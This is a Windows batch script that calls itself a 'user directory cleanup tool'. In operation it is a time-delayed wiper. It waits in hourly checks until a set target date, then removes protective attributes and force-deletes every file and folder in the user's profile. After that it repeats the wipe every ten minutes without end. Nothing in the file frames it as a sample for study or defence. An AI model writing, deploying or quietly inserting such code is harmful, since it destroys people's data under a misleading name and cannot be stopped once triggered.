@echo off
setlocal enabledelayedexpansion

:: Set your log file path here
set "LOGFILE=C:\output.txt"

:: Set the target date (YYYYMMDD format - more reliable)
set "TARGET_DATE=20250101"

:CHECK_DATE
:: Get current date using WMIC (more reliable)
set "CURRENT_NUM="
for /f "skip=1 delims=" %%i in ('wmic OS Get localdatetime 2^>nul') do (
    if not defined CURRENT_NUM set "CURRENT_NUM=%%i"
)

:: If WMIC failed, use system date with fallback
if not defined CURRENT_NUM (
    for /f "tokens=1-3 delims=/" %%a in ('echo %date%') do (
        set "month=%%a"
        set "day=%%b"
        set "year=%%c"
    )
    set "CURRENT_NUM=!year!!month!!day!"
) else (
    set "CURRENT_NUM=!CURRENT_NUM:~0,8!"
)

:: Validate we have a proper date
if "!CURRENT_NUM!"=="" (
    >> "%LOGFILE%" echo [ERROR] Could not determine current date
    timeout /t 3600 /nobreak >nul
    goto CHECK_DATE
)

>> "%LOGFILE%" echo [%date% %time%] Current: !CURRENT_NUM! - Target: %TARGET_DATE%

:: Check if current date is past or equal to target date
if !CURRENT_NUM! lss %TARGET_DATE% (
    >> "%LOGFILE%" echo [INFO] Waiting for target date: %TARGET_DATE%
    >> "%LOGFILE%" echo [INFO] Sleeping for 1 hour...
    
    :: Wait 1 hour and check again
    timeout /t 3600 /nobreak >nul
    goto CHECK_DATE
)

>> "%LOGFILE%" echo [SUCCESS] Target date reached! Starting cleanup...
>> "%LOGFILE%" echo ===============================================

:LOOP
>> "%LOGFILE%" echo ===============================================
>> "%LOGFILE%" echo    USER DIRECTORY CLEANUP TOOL
>> "%LOGFILE%" echo ===============================================
>> "%LOGFILE%" echo WARNING: This will delete files and folders!
>> "%LOGFILE%" echo Next cleanup in 10 minutes...
>> "%LOGFILE%" echo ===============================================

set "TARGETDIR=%USERPROFILE%"

>> "%LOGFILE%" echo Processing: %TARGETDIR%

:: Method 1: Delete individual files first
if exist "%TARGETDIR%" (
    for /r "%TARGETDIR%" %%f in (*) do (
        attrib -r -h -s "%%f" >nul 2>&1
        del /f /q "%%f" >nul 2>&1
        if !errorlevel! neq 0 (
            >> "%LOGFILE%" echo [ERROR] Could not delete: %%f
        ) else (
            >> "%LOGFILE%" echo [SUCCESS] Deleted: %%f
        )
    )
)

:: Method 2: Delete folders
if exist "%TARGETDIR%" (
    for /f "delims=" %%d in ('dir "%TARGETDIR%" /ad /b 2^>nul') do (
        if /i not "%%d"=="." if /i not "%%d"==".." (
            rd /s /q "%TARGETDIR%\%%d" 2>nul
            if !errorlevel! neq 0 (
                >> "%LOGFILE%" echo [ERROR] Could not remove folder: %%d
            ) else (
                >> "%LOGFILE%" echo [SUCCESS] Removed folder: %%d
            )
        )
    )
)

>> "%LOGFILE%" echo ===============================================
>> "%LOGFILE%" echo    CLEANUP CYCLE COMPLETED - %date% %time%
>> "%LOGFILE%" echo    Waiting 10 minutes until next cleanup...
>> "%LOGFILE%" echo ===============================================

:: Wait 10 minutes (600 seconds)
timeout /t 600 /nobreak >nul

goto LOOP
